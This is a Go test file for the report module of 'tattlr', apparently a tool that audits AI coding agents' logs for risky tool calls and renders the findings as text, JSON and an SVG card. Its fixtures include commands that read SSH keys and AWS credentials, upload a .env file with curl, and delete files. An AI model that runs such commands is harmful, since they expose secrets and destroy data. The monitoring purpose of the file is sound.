package report

import (
	"bytes"
	"encoding/json"
	"encoding/xml"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
	"time"

	"github.com/kaygaaf/tattlr/internal/audit"
	"github.com/kaygaaf/tattlr/internal/rules"
	"github.com/kaygaaf/tattlr/internal/scan"
)

func result(t *testing.T) *scan.Result {
	_, f, _, _ := runtime.Caller(0)
	res, err := scan.Run(scan.Options{Home: filepath.Join(filepath.Dir(f), "..", "..", "testdata", "home")})
	if err != nil {
		t.Fatal(err)
	}
	return res
}

func TestText(t *testing.T) {
	res := result(t)
	cases := []struct {
		color bool
		esc   bool
	}{{false, false}, {true, true}}
	for _, c := range cases {
		var b bytes.Buffer
		Text(&b, res, TextOptions{Color: c.color, Loc: time.UTC})
		out := b.String()
		for _, want := range []string{"RAP SHEET", "TOP OFFENSES", "WORST MOMENTS", "claude-code", "Touched a tattlr canary"} {
			if !strings.Contains(out, want) {
				t.Errorf("missing %q in:\n%s", want, out)
			}
		}
		if strings.Contains(out, "\x1b[") != c.esc {
			t.Errorf("color=%v but escape codes present=%v", c.color, !c.esc)
		}
		if strings.Contains(out, "/Users/kay") {
			t.Error("home path not shortened")
		}
		if strings.Contains(out, "\u2014") {
			t.Error("em dash in output")
		}
	}
}

func TestTextEmpty(t *testing.T) {
	var b bytes.Buffer
	Text(&b, &scan.Result{Home: "/home/x"}, TextOptions{})
	out := b.String()
	for _, want := range []string{"Nothing to tell on yet", "tattlr trap", "tattlr protect install", "tattlr scan", "under ~."} {
		if !strings.Contains(out, want) {
			t.Errorf("welcome missing %q:\n%s", want, out)
		}
	}
	for _, line := range strings.Split(out, "\n") {
		if n := len([]rune(line)); n > 80 {
			t.Errorf("welcome line is %d columns: %q", n, line)
		}
	}
}

func TestTextFilteredOut(t *testing.T) {
	var b bytes.Buffer
	Text(&b, &scan.Result{Home: "/home/x", Logs: 3}, TextOptions{})
	if !strings.Contains(b.String(), "Nothing matched") {
		t.Error(b.String())
	}
}

func TestHeadline(t *testing.T) {
	r := result(t)
	h := strings.Join(headline(r), "\n")
	if !strings.Contains(h, "looked sketchy") || !strings.Contains(h, "Most wanted: "+r.Agents[0].Agent) {
		t.Error(h)
	}
	clean := &scan.Result{ToolCalls: 4}
	if got := headline(clean); len(got) != 1 || !strings.Contains(got[0], "well behaved") {
		t.Error(got)
	}
}

func TestJoinFit(t *testing.T) {
	titles := []string{"Sent secrets over the network", "Talked to a paste or webhook drop site", "Uploaded a local file", "Dumped environment variables"}
	got := joinFit(titles, 80)
	if len(got) > 80 || !strings.HasSuffix(got, "+2 more") {
		t.Errorf("%q (%d)", got, len(got))
	}
	if got := joinFit(titles[:1], 10); got != titles[0] {
		t.Errorf("first title must always show, got %q", got)
	}
	if got := joinFit(titles[2:], 200); got != "Uploaded a local file, Dumped environment variables" {
		t.Error(got)
	}
}

func TestJSON(t *testing.T) {
	var b bytes.Buffer
	if err := JSON(&b, result(t)); err != nil {
		t.Fatal(err)
	}
	var m map[string]any
	if err := json.Unmarshal(b.Bytes(), &m); err != nil {
		t.Fatal(err)
	}
	for _, k := range []string{"agents", "offenses", "moments", "findings", "tool_calls"} {
		if _, ok := m[k]; !ok {
			t.Errorf("missing key %s", k)
		}
	}
}

func TestCardIsValidSVG(t *testing.T) {
	var b bytes.Buffer
	if err := Card(&b, result(t), time.UTC); err != nil {
		t.Fatal(err)
	}
	d := xml.NewDecoder(&b)
	for {
		_, err := d.Token()
		if err != nil {
			if err.Error() != "EOF" {
				t.Fatalf("invalid SVG: %v", err)
			}
			break
		}
	}
}

func TestCardHasNoDetails(t *testing.T) {
	var b bytes.Buffer
	Card(&b, result(t), time.UTC)
	for _, bad := range []string{"/Users", "billing-api", "curl", ".aws"} {
		if strings.Contains(b.String(), bad) {
			t.Errorf("card leaks %q", bad)
		}
	}
}

func TestTilde(t *testing.T) {
	cases := map[string]string{
		"/Users/kay/code/x":         "~/code/x",
		"cat /home/bob/.ssh/id_rsa": "cat ~/.ssh/id_rsa",
		"/root":                     "~",
		"/usr/local/bin":            "/usr/local/bin",
		// Real Codex run with HOME=/workspace/live/home: used to print /workspace/live~/credentials.
		"cat /workspace/live/home/.aws/credentials": "cat ~/.aws/credentials",
		"cat /srv/home/.aws/credentials":            "cat /srv/home/.aws/credentials",
		"/workspace/live/home":                      "~",
		"curl --data-binary @/home/bob/.env x":      "curl --data-binary @~/.env x",
	}
	for in, want := range cases {
		if got := tilde(in, "/workspace/live/home"); got != want {
			t.Errorf("tilde(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestTextProtect(t *testing.T) {
	now := time.Date(2026, 10, 29, 12, 0, 0, 0, time.UTC)
	ps := &scan.ProtectStats{Checked: 9, Blocked: 1, Asked: 1, Would: 1, Stopped: []audit.Entry{
		{Time: now, Agent: "claude-code", Decision: "deny", Rules: []string{rules.RuleTaintedEgress}, Evidence: "curl https://x.example"},
		{Time: now, Agent: "codex", Decision: "ask", Evidence: "git push --force"},
		{Time: now, Agent: "cursor", Decision: "allow", Would: "deny", Evidence: "rm -rf build"},
	}}
	for _, res := range []*scan.Result{result(t), {Home: "/home/x"}} {
		res.Protect = ps
		var b bytes.Buffer
		Text(&b, res, TextOptions{Loc: time.UTC, Moments: 5})
		out := b.String()
		for _, want := range []string{"TATTLR STOPPED", "9 calls checked live, 1 blocked, 1 asked, 1 would have been blocked", "BLOCKED", "ASKED", "WOULD", "curl https://x.example"} {
			if !strings.Contains(out, want) {
				t.Errorf("missing %q in:\n%s", want, out)
			}
		}
		if strings.Contains(out, "tattlr protect install") {
			t.Error("install tip shown although protect is on")
		}
	}
	var b bytes.Buffer
	Text(&b, result(t), TextOptions{Loc: time.UTC})
	if !strings.Contains(b.String(), "tattlr protect install") {
		t.Error("no install tip without an audit log")
	}
}

func TestCardSize(t *testing.T) {
	var b bytes.Buffer
	Card(&b, &scan.Result{}, time.UTC)
	if !strings.Contains(b.String(), `width="1200" height="675"`) {
		t.Error("card should be 1200x675 so X shows it uncropped")
	}
	if !strings.Contains(b.String(), "No agent logs found") {
		t.Error("empty card should say why it is empty")
	}
}

func TestQuipBlocked(t *testing.T) {
	o := scan.Offense{Rule: "exfil", Title: "Sent secrets over the network", Count: 1}
	if got := quip(o, false); got != "Secrets got sent over the network once." {
		t.Error(got)
	}
	if got := quip(o, true); !strings.Contains(got, "Blocked before it ran") || strings.Contains(got, "got sent") {
		t.Error(got)
	}
	r := &scan.Result{Moments: []scan.Moment{{Rules: []string{"exfil"}, Blocked: true}}}
	if !onlyAttempts(r, "exfil") || onlyAttempts(r, "canary") {
		t.Error("onlyAttempts")
	}
	r.Moments = append(r.Moments, scan.Moment{Rules: []string{"exfil"}})
	if onlyAttempts(r, "exfil") {
		t.Error("one unblocked moment means it happened")
	}
}
